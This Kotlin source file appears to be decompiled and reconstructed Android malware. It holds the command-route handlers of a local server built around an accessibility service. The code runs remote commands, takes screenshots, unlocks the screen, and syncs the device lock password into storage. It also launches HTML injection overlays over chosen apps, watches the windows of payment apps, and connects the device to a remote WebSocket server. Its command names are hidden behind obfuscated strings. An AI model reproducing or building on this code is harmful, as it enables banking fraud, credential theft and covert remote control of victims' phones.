package com.storm.safe.rock.service.modules.routes

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.inject.jbqfkndyx
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeErrorResponse
import com.storm.safe.rock.service.modules.RemoteConfigManager.Companion.makeTextResponse
import com.storm.safe.rock.service.modules.cipher.ViewCacheCollector
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.util.StringUtil
import org.json.JSONArray
import org.json.JSONObject

/**
 * Application command, injection, and misc route handlers.
 *
 * Extracted from RemoteConfigManager (JADX: C0322a7).
 * JADX methods: a2, a3, a4, a5, b7, d1, d3, b6, d6,
 * plus inline routes /screenshot/0, /startApp, /killApp, /unlock.
 */
object AppRouteHandlers {
    private const val TAG = "LocalHttpServer"

    // ---------------------------------------------------------------
    // Command execution bridge (sync adapter for suspend dispatch)
    // JADX: m211597a2 (a2), m211598a3 (a3), m211599a4 (a4), m211600a5 (a5)
    // ---------------------------------------------------------------

    /**
     * Execute command via CommandDispatcher.
     * JADX: m211597a2 (a2) -- /command, /exec
     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
     */
    @JvmStatic
    fun executeCommand(params: Map<String, String>, body: String?, commandDispatcher: CommandDispatcher?): JSONObject {
        val dispatcher = commandDispatcher
            ?: return makeErrorResponse("命令分发器未初始化")

        val json = JSONObject()
        if (body != null && body.trimStart().startsWith("{")) {
            try {
                val bodyJson = JSONObject(body)
                val cmdKey = StringUtil.decrypt("KFYcN0w2CA==")
                val cmd = bodyJson.optString(cmdKey, params[cmdKey] ?: "")
                json.put(cmdKey, cmd)
                if (bodyJson.has("params")) {
                    json.put("params", bodyJson.getJSONObject("params"))
                }
            } catch (_: Exception) {
                // Fall through to params-based extraction
            }
        }
        if (!json.has(StringUtil.decrypt("KFYcN0w2CA=="))) {
            val cmdKey = StringUtil.decrypt("KFYcN0w2CA==")
            val cmd = params[cmdKey] ?: return makeErrorResponse("缺少 command 参数")
            json.put(cmdKey, cmd)
            val paramsJson = JSONObject()
            for ((k, v) in params) {
                if (k != cmdKey) {
                    paramsJson.put(k, v)
                }
            }
            if (paramsJson.length() > 0) {
                json.put("params", paramsJson)
            }
        }

        val command = json.optString(StringUtil.decrypt("KFYcN0w2CA=="), "")
        Log.d(TAG, "★ 执行命令: $command")

        // JADX: vendor uses coroutine dispatch (c0350a7.m211883a0); translated to runBlocking
        return try {
            val handled = kotlinx.coroutines.runBlocking {
                dispatcher.dispatch(json)
            }
            if (handled) {
                makeTextResponse("命令已执行: $command")
            } else {
                makeErrorResponse("命令未处理: $command")
            }
        } catch (e: Exception) {
            makeErrorResponse("命令执行异常: ${e.message}")
        }
    }

    /**
     * Direct dispatch -- pass raw JSON body to CommandDispatcher.
     * Body must be: {"command": "X", "params": {...}}
     * No key translation -- uses "command" key directly (matches CommandDispatcher.KEY_COMMAND).
     */
    @JvmStatic
    fun dispatchCommand(body: String?, commandDispatcher: CommandDispatcher?): JSONObject {
        if (body.isNullOrBlank()) return makeErrorResponse("缺少请求体")
        val dispatcher = commandDispatcher ?: return makeErrorResponse("命令分发器未初始化")
        return try {
            val json = JSONObject(body)
            val command = json.optString("command", "")
            if (command.isEmpty()) return makeErrorResponse("缺少 command 字段")
            Log.d(TAG, "★ 直接分发命令: $command")
            val handled = kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
            if (handled) makeTextResponse("命令已执行: $command")
            else makeErrorResponse("命令未处理: $command")
        } catch (e: Exception) {
            makeErrorResponse("命令分发异常: ${e.message}")
        }
    }

    /**
     * Execute global action via CommandDispatcher.
     * JADX: m211598a3 (a3) -- /global/action
     */
    @JvmStatic
    fun executeGlobalAction(params: Map<String, String>, body: String?, commandDispatcher: CommandDispatcher?): JSONObject {
        val dispatcher = commandDispatcher
            ?: return makeErrorResponse("命令分发器未初始化")

        var action = params["action"]
        if (action == null && body != null) {
            try {
                action = JSONObject(body).optString("action")
            } catch (_: Exception) {
            }
        }
        if (action == null) {
            return makeErrorResponse("缺少 action 参数")
        }

        val json = JSONObject()
        json.put(StringUtil.decrypt("KFYcN0w2CA=="), action)
        val paramsJson = JSONObject()
        for ((k, v) in params) {
            if (k != "action") {
                paramsJson.put(k, v)
            }
        }
        if (paramsJson.length() > 0) {
            json.put("params", paramsJson)
        }

        return try {
            val handled = kotlinx.coroutines.runBlocking {
                dispatcher.dispatch(json)
            }
            if (handled) {
                makeTextResponse("全局动作已执行: $action")
            } else {
                makeErrorResponse("动作未处理: $action")
            }
        } catch (e: Exception) {
            makeErrorResponse("全局动作异常: ${e.message}")
        }
    }

    /**
     * Lock screen command.
     * JADX: m211599a4 (a4) -- /global/lockScreen
     */
    @JvmStatic
    fun executeLockScreen(commandDispatcher: CommandDispatcher?): JSONObject {
        val json = JSONObject()
        json.put(StringUtil.decrypt("KFYcN0w2CA=="), StringUtil.decrypt("G3YmH38HPwJyFBs="))
        val dispatcher = commandDispatcher
        if (dispatcher != null) {
            try {
                kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
            } catch (_: Exception) {
            }
        }
        return makeTextResponse("锁屏命令已发送")
    }

    /**
     * Wake screen command.
     * JADX: m211600a5 (a5) -- /global/wakeUpScreen
     */
    @JvmStatic
    fun executeWakeScreen(commandDispatcher: CommandDispatcher?): JSONObject {
        val json = JSONObject()
        json.put(StringUtil.decrypt("KFYcN0w2CA=="), StringUtil.decrypt("G3YmH38HOw98FA=="))
        val dispatcher = commandDispatcher
        if (dispatcher != null) {
            try {
                kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
            } catch (_: Exception) {
            }
        }
        return makeTextResponse("唤醒命令已发送")
    }

    // ---------------------------------------------------------------
    // Inline route shortcuts: /screenshot/0, /startApp, /killApp, /unlock
    // ---------------------------------------------------------------

    /**
     * /screenshot/0 -- delegates to executeCommand with TAKE_SCREENSHOT_BASE64.
     * JADX: inline in routeRequest switch.
     */
    @JvmStatic
    fun screenshotCommand(commandDispatcher: CommandDispatcher?): JSONObject {
        val screenshotParams = mapOf(
            StringUtil.decrypt("KFYcN0w2CA==") to
                    StringUtil.decrypt("GHojH2gWMw12AR9sIx9yCikdYhwO")
        )
        return executeCommand(screenshotParams, null, commandDispatcher)
    }

    /**
     * /startApp -- delegates to executeCommand with START_APP.
     * JADX: inline in routeRequest switch.
     */
    @JvmStatic
    fun startAppCommand(params: Map<String, String>, body: String?, commandDispatcher: CommandDispatcher?): JSONObject {
        val merged = HashMap(params)
        merged[StringUtil.decrypt("KFYcN0w2CA==")] =
            StringUtil.decrypt("B3gkFG4QMw9nAQ==")
        return executeCommand(merged, body, commandDispatcher)
    }

    /**
     * /killApp -- delegates to executeCommand with KILL_APP.
     * JADX: inline in routeRequest switch.
     */
    @JvmStatic
    fun killAppCommand(params: Map<String, String>, body: String?, commandDispatcher: CommandDispatcher?): JSONObject {
        val merged = HashMap(params)
        merged[StringUtil.decrypt("KFYcN0w2CA==")] = "KILL_APP"
        return executeCommand(merged, body, commandDispatcher)
    }

    /**
     * /unlock -- delegates to executeCommand with UNLOCK_SCREEN.
     * JADX: inline in routeRequest switch.
     */
    @JvmStatic
    fun unlockCommand(params: Map<String, String>, body: String?, commandDispatcher: CommandDispatcher?): JSONObject {
        val merged = HashMap(params)
        merged[StringUtil.decrypt("KFYcN0w2CA==")] =
            StringUtil.decrypt("Hnc9FW4TMwpyBwJ6NA==")
        return executeCommand(merged, body, commandDispatcher)
    }

    // ---------------------------------------------------------------
    // Injection -- JADX: d3
    // ---------------------------------------------------------------

    /**
     * /showInjection -- launch injection activity for a package.
     * JADX: m211621d3 (d3)
     */
    @JvmStatic
    fun showInjection(context: Context, body: String?, params: Map<String, String>): JSONObject {
        return try {
            var packageName = params["packageName"] ?: ""
            if (packageName.isEmpty()) {
                return makeErrorResponse("缺少 packageName 参数")
            }

            val service = MyAccessibilityService.getInstance()
                ?: return makeErrorResponse("dqtvuisjd 未运行")

            var htmlContent = params["htmlContent"] ?: ""
            if (htmlContent.isEmpty() && !body.isNullOrEmpty()) {
                try {
                    htmlContent = JSONObject(body).optString("htmlContent", "")
                } catch (_: Exception) {
                }
            }
            if (htmlContent.isEmpty()) {
                synchronized(service.injectionTasksLock) {
                    htmlContent = service.injectionTasks[packageName] ?: ""
                }
            }
            if (htmlContent.isEmpty()) {
                return makeErrorResponse("没有找到 $packageName 的注入任务（HTML内容为空）")
            }

            // JADX: check if jbqfkndyx is active and in foreground -- skip if already showing
            if (jbqfkndyx.active && jbqfkndyx.inForeground) {
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json.put("message", "注入页面已在前台，跳过")
                return json
            }

            // JADX: launch injection activity with proper flags
            val intent = Intent(context, jbqfkndyx::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            intent.putExtra("package_name", packageName)
            intent.putExtra("html_content", htmlContent)
            context.startActivity(intent)
            Log.d(TAG, "✅ [注入] local-service 触发注入页面: $packageName")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("message", "注入页面已启动: $packageName")
            json
        } catch (e: Exception) {
            Log.e(TAG, "显示注入页面失败", e)
            makeErrorResponse("显示注入页面失败: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Browser apps -- JADX: b7
    // ---------------------------------------------------------------

    /**
     * /browserApps -- list installed browser apps.
     * JADX: m211609b7 (b7)
     */
    @JvmStatic
    fun browserApps(context: Context): JSONObject {
        return try {
            val pm = context.packageManager
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("http://"))
            val activities = pm.queryIntentActivities(intent, 0)
            val arr = JSONArray()
            for (ri in activities) {
                val item = JSONObject()
                item.put("packageName", ri.activityInfo.packageName)
                item.put("appName", ri.loadLabel(pm).toString())
                arr.put(item)
            }
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("data", arr)
            json
        } catch (e: Exception) {
            makeErrorResponse("browserApps 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Payment strategies -- JADX: d1
    // ---------------------------------------------------------------

    /**
     * /setPaymentStrategies -- configure cipher/payment detection strategies.
     * JADX: m211619d1 (d1)
     */
    @JvmStatic
    fun setPaymentStrategies(context: Context, body: String?): JSONObject {
        if (body.isNullOrEmpty()) {
            return makeErrorResponse("缺少请求体")
        }
        return try {
            val arr = JSONArray(body)
            // JADX: C0341a7.f53380c1.getInstance() -> ViewCacheCollector singleton
            val vcc = ViewCacheCollector.instance
            if (vcc == null) {
                Log.w(TAG, "ViewCacheCollector 未初始化，保存配置待稍后加载")
                context.getSharedPreferences("payment_strategies", 0)
                    .edit().putString("strategies", body).apply()
                return makeTextResponse("配置已保存，等待加载")
            }
            // JADX: c0340a6.f53385a2.clear() + c0340a6.m211872b2()
            vcc.rules.clear()
            vcc.stopCapture()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val pkg = obj.optString("packageName", "")
                val appName = obj.optString("appName", "")
                val winClassesArr = obj.optJSONArray("listenWinClasses")
                val winClasses = ArrayList<String>()
                if (winClassesArr != null) {
                    for (j in 0 until winClassesArr.length()) {
                        winClasses.add(winClassesArr.getString(j))
                    }
                }
                if (pkg.isNotEmpty()) {
                    // JADX: c0340a6.m211861a0(pkg, winClasses, appName)
                    vcc.addRule(pkg, winClasses, appName)
                }
            }
            context.getSharedPreferences("payment_strategies", 0)
                .edit().putString("strategies", body).apply()
            Log.d(TAG, "✅ 支付策略已更新: ${arr.length()} 条")
            makeTextResponse("已更新 ${arr.length()} 条策略")
        } catch (e: Exception) {
            Log.e(TAG, "解析支付策略失败", e)
            makeErrorResponse("解析失败: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Block view overlay -- JADX: b6
    // ---------------------------------------------------------------

    /**
     * /blockView -- show/hide block overlay.
     * JADX: m211608b6 (b6)
     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
     */
    @JvmStatic
    fun handleBlockView(params: Map<String, String>, commandDispatcher: CommandDispatcher?): JSONObject {
        return try {
            val action = params["action"] ?: "show"
            val text = params["text"] ?: ""
            val alphaStr = params["alpha"]
            val alpha = alphaStr?.toIntOrNull() ?: 0xFF

            val cmdName = StringUtil.decrypt(
                if (action == "hide") "D3AiG28UKRF1HQp6OgV+Gz4Lch8="
                else "DncwGGEdMwx7EAhyLgluCikLeQ=="
            )

            val json = JSONObject()
            json.put(StringUtil.decrypt("KFYcN0w2CA=="), cmdName)
            val paramsJson = JSONObject()
            paramsJson.put("text", text)
            paramsJson.put("alpha", alpha)
            json.put("params", paramsJson)

            val dispatcher = commandDispatcher
            if (dispatcher != null) {
                try {
                    kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
                } catch (_: Exception) {
                }
            }

            makeTextResponse("遮罩命令已执行: $cmdName")
        } catch (e: Exception) {
            makeErrorResponse("blockView 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Lock cipher -- JADX: d6
    // ---------------------------------------------------------------

    /**
     * /syncLockCipher -- sync lock password to prefs.
     * JADX: m211624d6 (d6)
     */
    @JvmStatic
    fun syncLockCipher(context: Context, body: String?, params: Map<String, String>): JSONObject {
        return try {
            var cipher = params["cipher"]
            if (cipher == null) {
                cipher = ""
                if (body != null) {
                    try {
                        cipher = JSONObject(body).optString("cipher", "")
                    } catch (_: Exception) {
                        cipher = ""
                    }
                }
            }
            if (cipher != null && cipher.isNotEmpty()) {
                context.getSharedPreferences("local_config", 0)
                    .edit()
                    .putString(StringUtil.decrypt("J1YSMXI7BT5fNDk="), cipher)
                    .apply()
                Log.d(TAG, "🔐 [syncLockCipher] 密码已同步")
            }
            makeTextResponse("syncLockCipher done")
        } catch (e: Exception) {
            makeErrorResponse("syncLockCipher 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // WebSocket connection -- inline in routeRequest
    // ---------------------------------------------------------------

    /**
     * /connectWebSocket -- trigger WebSocket connection.
     * JADX: inline in routeRequest switch.
     */
    @JvmStatic
    fun connectWebSocket(context: Context, params: Map<String, String>): JSONObject {
        val wsUrl = params["url"] ?: params["serverUrl"] ?: ""
        val devId = params["deviceId"] ?: ""
        if (wsUrl.isEmpty()) {
            return makeErrorResponse("url 参数必填 (ws://host:port)")
        }
        return try {
            val service = MyAccessibilityService.instance
            val nm = service?.networkManager
            if (nm == null) {
                makeErrorResponse("NetworkManager 未初始化")
            } else {
                val actualDeviceId = if (devId.isNotEmpty()) devId
                    else Settings.Secure.getString(
                        context.contentResolver, "android_id") ?: "unknown"
                nm.connectToServer(wsUrl, actualDeviceId)
                makeTextResponse("WebSocket 连接已触发: url=$wsUrl, deviceId=$actualDeviceId")
            }
        } catch (e: Exception) {
            makeErrorResponse("WebSocket 连接失败: ${e.message}")
        }
    }
}
